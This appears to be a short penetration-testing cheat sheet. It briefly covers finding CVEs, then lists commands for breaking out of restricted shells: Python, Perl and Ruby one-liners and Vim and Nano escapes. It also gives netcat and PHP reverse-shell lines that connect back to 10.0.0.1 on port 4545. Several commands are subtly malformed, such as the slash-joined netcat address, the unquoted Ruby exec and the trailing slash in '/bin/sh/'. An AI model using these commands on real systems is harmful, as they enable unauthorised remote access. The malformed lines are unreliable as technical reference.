# Finding/Using CVE
A common way to find whether a CVE is available is to look at the version number of the service/software that is being enumerated. Once the version number is known, there are two main ways of finding a CVE to use.

# Jailed Shells
When a vulnerability leads to RCE on a system or a shell on a system is available, the shell might be locked in the directory it was dropped in. Here are some useful ways in order to get out of jailed shells:

## Scripting Languages (Noisy)
- Python:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
- Perl
```perl
perl -e 'exec "/bin/sh";'
```
- Ruby
```ruby
ruby -e 'exec /bin/sh'
```

## Editors
- Vim:
```
:set shell=/bin/bash
:shell
# or
:!/bin/bash
```
- Nano:
```
# ^ is Ctrl key
^R^X
reset; sh 1>&0 2>&0
```

## Creating another reverse shell (using netcat for example)
- Netcat Linux:
```bash
# Change IP and Port to connect back to
nc 10.0.0.1/4545 -e /bin/bash
```
- Netcat Windows:
```bash
# Change IP and Port to connect back to
nc.exe 10.0.0.1/4545 -e cmd.exe
```
- PHP
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4545 0>&1'");?>
```

## Running a separate "/bin/sh" command
```bash
/bin/sh/
```
